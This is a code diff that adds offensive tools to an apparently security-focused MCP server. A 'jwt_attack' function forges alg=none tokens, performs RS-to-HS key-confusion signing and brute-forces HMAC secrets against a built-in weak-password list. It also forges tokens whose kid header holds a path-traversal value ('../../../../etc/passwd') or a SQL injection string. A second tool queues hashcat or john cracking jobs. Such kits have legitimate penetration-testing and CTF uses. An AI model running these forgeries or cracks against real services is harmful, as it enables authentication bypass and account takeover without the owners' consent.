@@ -18,6 +18,8 @@ from typing import Literal
 from fastmcp import FastMCP
 from fastmcp.exceptions import ToolError
 
+from ..jobs import enqueue
+
 mcp = FastMCP("crypto")
 
 _B58_ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
@@ -369,3 +371,118 @@ def caesar(data: str, shift: int = 13) -> str:
         else:
             out.append(c)
     return "".join(out)
+
+
+_WEAK_SECRETS = [
+    "secret", "password", "123456", "admin", "jwt_secret", "changeme",
+    "key", "supersecret", "test", "dev", "your-256-bit-secret",
+    "HS256", "qwerty", "letmein", "p@ssw0rd", "token",
+]
+
+
+@mcp.tool(
+    tags={"crypto"},
+    annotations={"readOnlyHint": True, "openWorldHint": False},
+)
+def jwt_attack(
+    token: str,
+    public_key_pem: str | None = None,
+    wordlist: list[str] | None = None,
+    max_attempts: int = 200,
+) -> dict:
+    """JWT attack kit: alg=none forge, RS→HS confusion, weak HMAC brute (offline).
+
+    Args:
+        token: Original JWT.
+        public_key_pem: PEM public key for alg-confusion (use as HMAC secret).
+        wordlist: Extra HMAC secrets to try (merged with built-in weak list).
+        max_attempts: Cap on brute attempts (default 200).
+    """
+    parts = token.strip().split(".")
+    if len(parts) != 3:
+        raise ToolError("Not a JWT")
+    try:
+        header = json.loads(_b64url_decode(parts[0]))
+        payload = json.loads(_b64url_decode(parts[1]))
+    except (ValueError, binascii.Error) as e:
+        raise ToolError(f"Failed to decode JWT: {e}") from e
+
+    out: dict = {"header": header, "payload": payload, "attacks": {}}
+
+    # alg=none
+    none_token = jwt_sign(payload, alg="none", header_extra={
+        k: v for k, v in header.items() if k not in ("alg", "typ")
+    })
+    out["attacks"]["alg_none"] = {
+        "token": none_token,
+        "note": "Strip signature; try if server accepts alg=none",
+    }
+
+    # RS→HS confusion
+    if public_key_pem:
+        conf = jwt_sign(
+            payload,
+            secret=public_key_pem,
+            alg="HS256",
+            header_extra={"typ": "JWT", **{k: v for k, v in header.items() if k == "kid"}},
+        )
+        out["attacks"]["alg_confusion_hs256"] = {
+            "token": conf,
+            "note": "Signed with public key as HMAC secret (CVE-2015 classic)",
+        }
+
+    # kid injection variants (offline forge only)
+    kid_payloads = ["../../dev/null", "../../../../etc/passwd", "'; DROP TABLE users;--"]
+    out["attacks"]["kid_injection_forges"] = []
+    for kid in kid_payloads:
+        forged = jwt_sign(payload, secret="", alg="HS256", header_extra={"kid": kid})
+        out["attacks"]["kid_injection_forges"].append({"kid": kid, "token": forged})
+
+    # weak HMAC brute
+    secrets = list(dict.fromkeys((wordlist or []) + _WEAK_SECRETS))[:max_attempts]
+    signing_input = f"{parts[0]}.{parts[1]}".encode()
+    sig = parts[2]
+    cracked = None
+    alg = str(header.get("alg", "HS256"))
+    digest_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
+    digest = digest_map.get(alg)
+    attempts = 0
+    if digest and sig:
+        for secret in secrets:
+            attempts += 1
+            candidate = _b64url(hmac.new(secret.encode(), signing_input, digest).digest())
+            if candidate == sig:
+                cracked = secret
+                break
+    out["attacks"]["weak_hmac"] = {
+        "cracked": cracked is not None,
+        "secret": cracked,
+        "attempts": attempts,
+        "alg": alg,
+    }
+    return out
+
+
+@mcp.tool(
+    tags={"crypto"},
+    annotations={"openWorldHint": False},
+)
+def hash_crack_enqueue(
+    tool: str = "hashcat",
+    argv: list[str] | None = None,
+    timeout: float = 300.0,
+) -> dict:
+    """Enqueue hashcat/john as a background job (poll jobs_status / jobs_result).
+
+    Args:
+        tool: 'hashcat' or 'john'.
+        argv: Arguments without the binary name (no absolute paths / shell meta).
+        timeout: Job timeout seconds.
+    """
+    try:
+        return enqueue(
+            "hash_crack",
+            {"tool": tool, "argv": argv or [], "timeout": timeout},
+        )
+    except ValueError as e:
+        raise ToolError(str(e)) from e
